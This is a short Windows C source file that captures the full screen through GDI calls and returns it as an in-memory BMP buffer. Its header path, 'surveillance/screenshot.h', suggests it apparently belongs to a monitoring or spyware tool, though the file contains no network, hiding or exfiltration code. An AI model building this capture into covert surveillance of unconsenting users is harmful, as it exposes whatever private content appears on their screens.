#include <windows.h>
#include <surveillance/screenshot.h>
#include <stdio.h>

BOOL Screenshot_Capture(BYTE** buffer, DWORD* size) {
    HDC hdcScreen = NULL;
    HDC hdcMem = NULL;
    HBITMAP hBitmap = NULL;
    HBITMAP hOldBitmap = NULL;
    BOOL success = FALSE;
    BYTE* pixelData = NULL;
    BYTE* finalBuffer = NULL;

    // Get screen dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Get screen device context
    hdcScreen = GetDC(NULL);
    if (!hdcScreen) goto cleanup;

    // Create compatible DC and Bitmap
    hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) goto cleanup;

    hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hBitmap) goto cleanup;

    // Select bitmap into DC
    hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

    // Copy screen to memory DC
    if (!BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY))
        goto cleanup;

    // Prepare Bitmap Info
    BITMAPINFO bmpInfo = {0};
    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfo.bmiHeader.biWidth = width;
    bmpInfo.bmiHeader.biHeight = height;
    bmpInfo.bmiHeader.biPlanes = 1;
    bmpInfo.bmiHeader.biBitCount = 24; // RGB 24-bit
    bmpInfo.bmiHeader.biCompression = BI_RGB;

    // Get size of image data
    if (!GetDIBits(hdcMem, hBitmap, 0, height, NULL, &bmpInfo, DIB_RGB_COLORS))
        goto cleanup;

    // Allocate memory for pixels
    DWORD pixelDataSize = bmpInfo.bmiHeader.biSizeImage;
    pixelData = (BYTE*)malloc(pixelDataSize);
    if (!pixelData) goto cleanup;

    // Get the actual pixel data
    if (!GetDIBits(hdcMem, hBitmap, 0, height, pixelData, &bmpInfo, DIB_RGB_COLORS))
        goto cleanup;

    // Prepare File Header
    BITMAPFILEHEADER bmpFileHeader = {0};
    bmpFileHeader.bfType = 0x4D42; // "BM"
    bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmpFileHeader.bfSize = bmpFileHeader.bfOffBits + pixelDataSize;

    // Allocate final buffer
    *size = bmpFileHeader.bfSize;
    finalBuffer = (BYTE*)malloc(*size);
    if (!finalBuffer) goto cleanup;

    // Copy everything to final buffer
    memcpy(finalBuffer, &bmpFileHeader, sizeof(BITMAPFILEHEADER));
    memcpy(finalBuffer + sizeof(BITMAPFILEHEADER), &bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER));
    memcpy(finalBuffer + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixelData, pixelDataSize);

    *buffer = finalBuffer;
    success = TRUE;

cleanup:
    if (pixelData) free(pixelData);
    if (hOldBitmap) SelectObject(hdcMem, hOldBitmap);
    if (hBitmap) DeleteObject(hBitmap);
    if (hdcMem) DeleteDC(hdcMem);
    if (hdcScreen) ReleaseDC(NULL, hdcScreen);

    if (!success && finalBuffer) {
        free(finalBuffer);
        *buffer = NULL;
        *size = 0;
    }

    return success;
}
